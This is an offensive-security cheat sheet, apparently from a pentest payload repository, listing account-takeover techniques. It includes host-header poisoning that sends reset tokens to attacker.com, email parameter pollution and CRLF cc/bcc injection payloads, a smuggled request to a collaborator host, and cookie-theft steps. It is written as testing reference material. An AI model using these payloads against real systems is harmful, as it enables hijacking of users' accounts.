# Account Takeover

> Account Takeover (ATO) is a significant threat in the cybersecurity landscape, involving unauthorized access to users' accounts through various attack vectors.

## Summary

* [Password Reset Feature](#password-reset-feature)
    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)
    * [IDOR on API Parameters](#idor-on-api-parameters)
    * [Weak Password Reset Token](#weak-password-reset-token)
    * [Leaking Password Reset Token](#leaking-password-reset-token)
    * [Password Reset via Username Collision](#password-reset-via-username-collision)
    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
* [Account Takeover via Web Vulneralities](#account-takeover-via-web-vulneralities)
    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
    * [Account Takeover via CSRF](#account-takeover-via-csrf)
* [References](#references)

## Password Reset Feature

### Password Reset Token Leak via Referrer

1. Request password reset to your email address
2. Click on the password reset link
3. Don't change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Account Takeover Through Password Reset Poisoning

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```

4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset via Email Parameter

```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters

1. Attacker have to login with their account and go to the **Change password** feature.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters : User ID/email

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### Weak Password Reset Token

The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

* Timestamp
* UserID
* Email of User
* Firstname and Lastname
* Date of Birth
* Cryptography
* Number only
* Small token sequence (<6 characters between [A-Z,a-z,0-9])
* Token reuse
* Token expiration date

### Leaking Password Reset Token

1. Trigger a password reset request using the API/UI for a specific email e.g: <test@mail.com>
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset via Username Collision

1. Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim password.
4. Connect to the victim account with the new password.

The platform CTFd was vulnerable to this attack.
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Due To Unicode Normalization Issue

When processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.  

* Victim account: `demo@gmail.com`
* Attacker account: `demⓞ@gmail.com`

[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).

[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.

## Account Takeover via Web Vulneralities

### Account Takeover via Cross Site Scripting

1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2. Leak the current **sessions cookie**
3. Authenticate as the user using the cookie

### Account Takeover via HTTP Request Smuggling

Refer to **HTTP Request Smuggling** vulnerability page.

1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:

    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```

3. Final request could look like the following

    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```

Hackerone reports exploiting this bug

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### Account Takeover via CSRF

1. Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
2. Send the payload

### Account Takeover via JWT

JSON Web Token might be used to authenticate an user.

* Edit the JWT with another User ID / Email
* Check for weak JWT signature

## References

* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
